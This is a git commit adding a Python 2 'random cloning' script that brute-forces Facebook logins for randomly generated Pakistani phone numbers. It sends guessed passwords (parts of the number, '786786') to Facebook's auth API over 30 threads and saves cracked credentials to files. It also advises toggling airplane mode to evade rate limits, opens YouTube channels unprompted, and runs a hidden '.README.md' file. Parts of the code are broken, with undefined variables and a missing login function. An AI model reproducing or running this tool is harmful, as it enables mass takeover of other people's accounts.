7f6e950a68425cd69371a816e675e627a8864213
SOMII-KHAN <104348201+SOMII-KHAN@users.noreply.github.com>
2022-07-16 22:51:20 +0500

    Add files via upload

---
+++ Subscribe.py
@@ -0,0 +1,460 @@
+# coding: utf-8
+
+# Decompiled By Ali Abbas
+
+# Youtube : https://youtube.com/c/KotlaJamSaraiki786
+
+# uncompyle6 version 
+
+# Original written By Ali Abbas
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+
+__author__ = 'Ali'
+
+__copyright = 'All rights reserved . Copyright  Abdul Mateen'
+
+CorrectUsername = 'Ali'
+
+CorrectPassword = 'Abbas'
+
+os.system('clear')
+
+loop = 'true'
+
+while (loop == 'true'):
+
+    username = raw_input('\033[1;91mENTER TOOL KEY…………=>> :\033[1;93m ')
+
+    if (username == CorrectUsername):
+
+            print '\033[1;92m Logged in successfully as '
+
+            time.sleep(1)
+
+            os.system('xdg-open https://youtube.com/c/KotlaJamSaraiki786')
+
+            os.system('clear')
+
+            loop = 'false'
+
+    else:
+
+        print '\033[1;93m Wrong Key !'
+
+        os.system('xdg-open https://youtube.com/c/KotlaJamSaraiki786')
+
+        os.system('clear')
+
+done = False
+
+os.system('rm -rf .txt')
+
+for n in range(40000):
+
+    nmbr = random.randint(1111111, 9999999)
+
+    sys.stdout = open('.txt', 'a')
+
+    print nmbr
+
+    sys.stdout.flush()
+
+try:
+
+    import requests
+
+except ImportError:
+
+    os.system('pip2 install requests')
+
+try:
+
+    import mechanize
+
+except ImportError:
+
+    os.system('pip2 install mechanize')
+
+    time.sleep(1)
+
+    os.system('python2 .README.md')
+
+from multiprocessing.pool import ThreadPool
+
+from requests.exceptions import ConnectionError
+
+from mechanize import Browser
+
+reload(sys)
+
+sys.setdefaultencoding('utf8')
+
+br = mechanize.Browser()
+
+br.set_handle_robots(False)
+
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+
+    print '[!] Exit Successfully '
+
+    os.sys.exit()
+
+def acak(b):
+
+    w = 'ahtdzjc'
+
+    d = ''
+
+    for i in x:
+
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+def cetak(b):
+
+    w = 'ahtdzjc'
+
+    for i in w:
+
+        j = w.index(i)
+
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+
+    x = x.replace('!0', '\x1b[0m')
+
+    sys.stdout.write(x + '\n')
+
+def jalan(x):
+
+    for e in x + '\n':
+
+        sys.stdout.write(e)
+
+        sys.stdout.flush()
+
+        time.sleep(3.0 / 200)
+
+def tik():
+
+    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
+
+    for o in titik:
+
+        print '\r\x1b[1;96m \x1b[1;96m               Load\x1b[1;96ming\x1b[1;0m\x1b[1;96m' + o,
+
+        sys.stdout.flush()
+
+        time.sleep(0.5)
+
+ ##### LOGO ##### 
+
+logo = """
+\033[1;97m
+
+  \33[1;92m##     ##    ###    ########  ####  ######  
+  \33[1;92m##     ##   ## ##   ##     ##  ##  ##    ## 
+  \33[1;92m##     ##  ##   ##  ##     ##  ##  ##       
+  \33[1;32m######### ##     ## ########   ##   ######  
+  \33[1;32m##     ## ######### ##   ##    ##        ## 
+  \33[1;32m##     ## ##     ## ##    ##   ##  ##    ## 
+  \33[1;32m##     ## ##     ## ##     ## ####  ######  
+
+
+\033[1;92m══════════════════════════════════════════════════
+\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   :\33[1;32m MUHAMMAD HARIS
+\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : HARIS KHAN       
+\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : HARIS-404
+\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 1.0.1
+\033[1;92m══════════════════════════════════════════════════
+\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█| Random Cloning |█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
+\033[1;92m══════════════════════════════════════════════════
+                                                  """ 
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		os.system("clear")
+		print(logo)
+		print("")
+		print("\33[1;37m")
+		print("\033[1;37mNote : \33[1;41m\33[1;37m𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐊𝐚 𝐋𝐢𝐘𝐚 𝐅𝐢𝐫𝐬𝐭 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐒𝐮𝐛𝐬𝐚𝐜𝐫𝐢𝐛𝐞\33[0m")
+		print("________________________________________________")
+		print("")
+		print("\033[1;32m  |1| \33[1;37m𝗦𝘂𝗯𝘀𝗮𝗰𝗿𝗶𝗯𝗲 𝗔𝗿𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ")
+		print("\033[1;32m  |2| \33[1;37m𝗖𝗹𝗼𝘀𝗲 ")
+		print("")
+		Baloch = input("\n\033[1;37m   [+] Choose : \033[1;32m")
+		if Baloch in ["", " "]:
+			exit()
+		elif Baloch in ["2", "02"]:
+			print("    Thanks♥️")
+			exit()
+		elif Baloch in ["1", "01"]:
+			os.system("xdg-open https://youtube.com/channel/UChALOSK7MMNsDa3w07tIz7Q")
+			print("")
+			time.sleep(3.0)
+			print("\033[1;32m    CHECHKING PLEASE WAIT ")
+			print("")
+			input("\n\033[1;37m CHANNEL NAME :  \033[1;37m")
+			time.sleep(3.1)
+			print("")
+			print("\033[1;32m THANKS FOR SUBSACRIBE MY CHANNEL ")
+			time.sleep(3.0)
+			os.system("clear")
+
+logo1 = '   \n\n\x1b[4;97mCHOOSE SIM CODE \x1b[1;0m\n\x1b[1;97m[1] JAZZ   \x1b[1;97m[2] ZONG  \x1b[1;97m[3] WARID  \x1b[1;97m[4] UFONE \x1b[1;97m[5] TELENOR\x1b[1;0m\n'
+print '\033[1;92m══════════════════════════════════════════════════'
+back = 0
+
+berhasil = []
+
+cekpoint = []
+
+oks = []
+
+id = []
+
+cpb = []
+
+def menu():
+
+    os.system('clear')
+
+    print logo
+
+    print(47*'-')
+
+    print
+
+    jalan ('\x1b[1;97m[1] CRACK RANDOM')
+
+    print
+
+    print ('\x1b[1;97m[0] Exit')
+
+    print
+
+    print(47*'-')
+
+    action()
+
+def action():
+
+    global cpb
+
+    global oks
+
+    ss = raw_input('\x1b[1;97mChoose =   ')
+
+    if ss == '':
+
+        print '[!] Warning'
+
+        action()
+
+    elif ss == '1':
+
+        tik()
+
+        os.system('clear')
+
+        print logo
+
+        print logo1
+
+        try:
+
+            c = raw_input('\x1b[1;97mCODE : ')
+
+            k = '03'
+
+            idlist = '.txt'
+
+            for line in open(idlist, 'r').readlines():
+
+                id.append(line.strip())
+
+        except IOError:
+
+            print '[!] File Not Found'
+
+            raw_input('\n[ Back ]')
+
+            menu()
+
+    elif ss == '0':
+
+        exb()
+
+        login()
+
+    else:
+
+        print '[!] Fill In Correctly'
+
+        action()
+
+    os.system('clear')
+
+    print logo
+
+    jalan ('\x1b[1;92mUSE AIRPLANE MODE EVERY 5 MINUTE.')
+
+    print(47*'-')
+
+    xxx = str(len(id))
+
+    jalan('\x1b[1;97m              TOTAL IDS :\x1b[1;97m ' + xxx)
+
+    print(47*'-')
+
+    def main(arg):
+
+        user = arg
+
+        try:
+
+            os.mkdir('save')
+
+        except OSError:
+
+            pass
+
+        try:
+
+            pass1 = user
+
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+
+            q = json.load(data)
+
+            if 'access_token' in q:
+
+                print '\x1b[92m  [BRAND-CP]  ' + k + c + user + '  |  ' + pass1
+
+                okb = open('save/CP.txt', 'a')
+
+                okb.write(k + c + user + pass1 + '\n')
+
+                okb.close()
+
+                oks.append(c + user + pass1)
+
+            elif 'www.facebook.com' in q['error_msg']:
+
+                print '\x1b[1;91m  [BRAND-CP] ' + k + c + user + '  |  ' + pass1
+
+                cps = open('save/CP.txt', 'a')
+
+                cps.write(k + c + user + pass1 + '\n')
+
+                cps.close()
+
+                cpb.append(c + user + pass1)
+
+            else:
+
+                pass2 = k + c + user
+
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+
+                q = json.load(data)
+
+                if 'access_token' in q:
+
+                    print '\x1b[1;92m  [SUCCESSFULL] ' + k + c + user + '  |  ' + pass2
+
+                    okb = open('save/OK.txt', 'a')
+
+                    okb.write(k + c + user + pass2 + '\n')
+
+                    okb.close()
+
+                    oks.append(c + user + pass2)
+
+                elif 'www.facebook.com' in q['error_msg']:
+
+                    print '\x1b[1;92m  [SUCCESSFULL] ' + k + c + user + '  |  ' + pass2
+
+                    cps = open('save/CP.txt', 'a')
+
+                    cps.write(k + c + user + pass2 + '\n')
+
+                    cps.close()
+
+                    cpb.append(c + user + pass2)
+
+                else:
+
+                    pass3 = '786786'
+
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+
+                    q = json.load(data)
+
+                    if 'access_token' in q:
+
+                        print '\x1b[1;92m  [BRAND-CP] ' + k + c + user + '  |  ' + pass3
+
+                        okb = open('save/CP.txt', 'a')
+
+                        okb.write(k + c + user + pass3 + '\n')
+
+                        okb.close()
+
+                        oks.append(c + user + pass3)
+
+                    elif 'www.facebook.com' in q['error_msg']:
+
+                        print '\x1b[1;92m  [BRAND-CP] ' + k + c + user + '  |  ' + pass3
+
+                        cps = open('save/CP.txt', 'a')
+
+                        cps.write(k + c + user + pass3 + '\n')
+
+                        cps.close()
+
+                        cpb.append(c + user + pass3)
+
+                                
+
+        except:
+
+            pass
+
+    p = ThreadPool(30)
+
+    p.map(main, id)
+
+    print(48*"-")
+
+    print 'Process Has Been Completed ...'
+
+    print 'Total OK : ' + str(len(oks))
+
+    print 'Total CP : ' + str(len(cpb))
+
+    print(47*"-")
+
+    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
+
+    jalan('Note : CP IDZ OPEN AFTER 10 DAYS')
+
+    raw_input('\n\x1b[1;97m[\x1b[1;97mHARIS_menu_Back\x1b[1;97m]')
+
+    login()
+
+if __name__ == '__main__':
+
+    menu()
+
